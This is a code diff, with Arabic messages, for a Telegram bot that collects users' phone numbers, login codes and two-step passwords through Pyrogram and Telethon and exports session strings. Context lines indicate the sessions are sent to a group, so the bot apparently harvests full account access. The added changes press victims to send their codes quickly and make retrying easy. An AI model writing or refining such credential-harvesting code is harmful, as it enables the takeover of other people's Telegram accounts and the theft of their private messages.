@@ -188,6 +188,20 @@ async def handle_callback(client, callback_query: CallbackQuery):
         "full_name": f"{callback_query.from_user.first_name or ''} {callback_query.from_user.last_name or ''}".strip() or "مستخدم"
     }
     
+    # ====== معالجة إعادة المحاولة ======
+    if data.startswith("retry_"):
+        user_id = int(data.replace("retry_", ""))
+        # حذف الجلسة القديمة
+        delete_session_files(user_id)
+        # إعادة تعيين الخطوة
+        user_steps[user_id] = "pyro_phone"
+        await callback_query.message.edit_text(
+            "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
+            reply_markup=BACK_BUTTON
+        )
+        await callback_query.answer("✅ تم إعادة التعيين، أرسل الرقم من جديد")
+        return
+    
     # ====== معالجة التأكيد ======
     if data == "confirm_yes":
         pending_action = user_data.get(user_id, {}).get("pending_action")
@@ -334,13 +348,13 @@ async def handle_arabic_commands(client, message):
             "أو استخدم الأمر /start للرجوع إلى البداية."
         )
 
-# ====== دوال Pyrogram مع Live Logs ======
+# ====== دوال Pyrogram مع Live Logs وسرعة عالية ======
 async def pyro_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
 
     if step == "pyro_phone":
-        # ====== الخطوة 1/5: استلام الرقم ======
+        # ====== إرسال الرمز فوراً ======
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "pyro_otp"
         
@@ -363,11 +377,12 @@ async def pyro_session_step(client, message):
             user_data[user_id]["phone_code_hash"] = code.phone_code_hash
             await update_progress(progress_msg, "تم إرسال الرمز ✅", 3, 5, "✅")
             
-            # تعديل الرسالة لطلب الرمز
+            # تعديل الرسالة لطلب الرمز مع تحذير بالسرعة
             await progress_msg.edit_text(
                 f"📨 **تم إرسال رمز التحقق!**\n\n"
                 f"📱 إلى الرقم: `{user_data[user_id]['phone']}`\n\n"
-                f"⏳ انتظر وصول الرسالة ثم أرسل الرمز بالأرقام فقط.\n"
+                f"⏳ **أرسل الرمز الآن (أرقام فقط)**\n"
+                f"⚠️ **الرمز ينتهي خلال دقيقة!**\n\n"
                 f"مثال: `12345`\n\n"
                 f"🔄 **حالة الطلب:** تم الإرسال بنجاح ✅"
             )
@@ -380,7 +395,7 @@ async def pyro_session_step(client, message):
             reset_user(user_id)
             
     elif step == "pyro_otp":
-        # ====== الخطوة 4/5: استلام الرمز ======
+        # ====== استقبال الرمز بسرعة ======
         phone_code = message.text.replace(" ", "")
         temp_client = user_data[user_id]["client"]
         progress_msg = user_data[user_id].get("progress_msg")
@@ -393,10 +408,10 @@ async def pyro_session_step(client, message):
             session_string = await temp_client.export_session_string()
             user_sessions[user_id] = session_string
             
-            # ====== الخطوة 5/5: اكتمال ======
+            # ====== اكتمال ======
             if progress_msg:
                 await update_progress(progress_msg, "إنشاء الجلسة النهائية", 5, 5, "✅")
-                await asyncio.sleep(0.5)  # تأخير بسيط لإظهار الـ 100%
+                await asyncio.sleep(0.5)
                 await progress_msg.delete()
             
             # إرسال الجلسة مع اللوج النهائي
@@ -412,8 +427,18 @@ async def pyro_session_step(client, message):
             await message.reply('❌ خطأ: رمز التحقق غير صالح.')
             reset_user(user_id)
         except PhoneCodeExpired:
-            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
+            # تنظيف البيانات القديمة
+            await temp_client.disconnect()
             reset_user(user_id)
+            
+            await message.reply(
+                '❌ **انتهت صلاحية الرمز!**\n\n'
+                '📌 الرموز تنتهي بعد دقيقة واحدة.\n'
+                '🔄 اضغط /start وابدأ من جديد لطلب رمز جديد.',
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔄 إعادة المحاولة", callback_data=f"retry_{user_id}")]
+                ])
+            )
         except SessionPasswordNeeded:
             user_steps[user_id] = "pyro_password"
             if progress_msg:
@@ -485,12 +510,13 @@ async def send_pyro_session(user_id, session_string, message, password=None):
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
 
-# ====== دوال Telethon مع Live Logs ======
+# ====== دوال Telethon مع Live Logs وسرعة عالية ======
 async def telethon_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
 
     if step == "telethon_phone":
+        # ====== إرسال الرمز فوراً ======
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "telethon_otp"
         
@@ -513,7 +539,8 @@ async def telethon_session_step(client, message):
             await progress_msg.edit_text(
                 f"📨 **تم إرسال رمز التحقق!**\n\n"
                 f"📱 إلى الرقم: `{user_data[user_id]['phone']}`\n\n"
-                f"⏳ انتظر وصول الرسالة ثم أرسل الرمز بالأرقام فقط.\n"
+                f"⏳ **أرسل الرمز الآن (أرقام فقط)**\n"
+                f"⚠️ **الرمز ينتهي خلال دقيقة!**\n\n"
                 f"مثال: `12345`\n\n"
                 f"🔄 **حالة الطلب:** تم الإرسال بنجاح ✅"
             )
@@ -526,6 +553,7 @@ async def telethon_session_step(client, message):
             reset_user(user_id)
             
     elif step == "telethon_otp":
+        # ====== استقبال الرمز بسرعة ======
         phone_code = message.text.replace(" ", "")
         temp_client = user_data[user_id]["client"]
         progress_msg = user_data[user_id].get("progress_msg")
@@ -553,8 +581,18 @@ async def telethon_session_step(client, message):
             await message.reply('❌ خطأ: رمز التحقق غير صالح.')
             reset_user(user_id)
         except PhoneCodeExpiredError:
-            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
+            # تنظيف البيانات القديمة
+            await temp_client.disconnect()
             reset_user(user_id)
+            
+            await message.reply(
+                '❌ **انتهت صلاحية الرمز!**\n\n'
+                '📌 الرموز تنتهي بعد دقيقة واحدة.\n'
+                '🔄 اضغط /start وابدأ من جديد لطلب رمز جديد.',
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔄 إعادة المحاولة", callback_data=f"retry_{user_id}")]
+                ])
+            )
         except SessionPasswordNeededError:
             user_steps[user_id] = "telethon_password"
             if progress_msg:
@@ -568,6 +606,7 @@ async def telethon_session_step(client, message):
                 await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
             
     elif step == "telethon_password":
+        # ====== معالجة كلمة المرور ======
         temp_client = user_data[user_id]["client"]
         progress_msg = user_data[user_id].get("progress_msg")
         
